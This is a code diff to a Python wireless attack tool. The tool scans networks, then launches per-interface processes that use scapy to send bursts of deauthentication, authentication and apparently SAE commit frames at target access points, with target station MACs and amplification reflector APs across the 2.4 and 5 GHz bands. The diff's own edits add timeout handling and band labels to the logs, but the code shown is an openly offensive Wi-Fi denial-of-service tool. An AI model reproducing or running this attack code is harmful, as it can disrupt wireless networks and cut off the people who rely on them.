@@ -287,7 +287,11 @@ def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
             time.sleep(scan_duration)
             if proc.poll() is None:
                 proc.terminate()
-                proc.wait(timeout=2)
+                try:
+                    proc.wait(timeout=2)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                    proc.wait() 
             csv_files = glob.glob(f"{prefix}-*.csv")
             if csv_files:
                 latest_csv = max(csv_files, key=os.path.getctime)
@@ -314,7 +318,7 @@ def scanner_process(scanner_iface, interval, scan_duration, shared_dict, lock):
 # =====================================================================================
 # ======================== ATTACK FUNCTIONS (VERSION 1 LOGIC) =========================
 # =====================================================================================
-def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list, finite_hex_list,
+def run_attacker_process(interface, bssid, channel, band, attack_type, scalar_hex_list, finite_hex_list,
                          counter, sta_macs=None, amplification_targets=None, opposite_bssid=None):
     """Scientific attack implementation – original Version 1 behavior"""
     from scapy.all import RandMAC, Dot11, RadioTap, Dot11Auth, Dot11Deauth, sendp
@@ -413,8 +417,7 @@ def run_attacker_process(interface, bssid, channel, attack_type, scalar_hex_list
                 send_burst_scientific(packets, interface, counter)
                 burst_count += 1
                 dt = time.time() - t_start
-                logger.info(f"[BURST] {interface} | Type: {attack_type} | Count: {burst_count} | Time: {dt:.3f}s")
-
+                logger.info(f"[BURST] {interface} ({band}, CH {channel}) | Type: {attack_type} | Count: {burst_count} | Time: {dt:.3f}s")
             # Scientific sleep to maintain target rate & avoid driver starvation
             time.sleep(max(0.01, 1.0 / (PACKETS_PER_SECOND_LIMIT / BURST_SIZE)))
 
@@ -498,14 +501,14 @@ def main():
                     refl = AMPLIFICATION_REFLECTOR_APS_5GHZ if band == '5GHz' else AMPLIFICATION_REFLECTOR_APS_2_4GHZ
 
                     p = Process(target=run_attacker_process,
-                                args=(iface, target_b, ch, attack, s_hex, f_hex, counters[iface]),
+                                args=(iface, target_b, ch, cfg['band'], attack, s_hex, f_hex, counters[iface]),
                                 kwargs={'sta_macs': TARGET_STA_MACS,
                                         'amplification_targets': refl,
                                         'opposite_bssid': None}, daemon=True)
                     procs[iface] = p
                     active_ch[iface] = ch
                     p.start()
-                    logger.info(f"[ORCHESTRATOR] {iface} -> {attack} on CH {ch}")
+                    logger.info(f"[ORCHESTRATOR] {iface} ({band}) -> {attack} on CH {ch}")
 
             time.sleep(1)
     except KeyboardInterrupt:
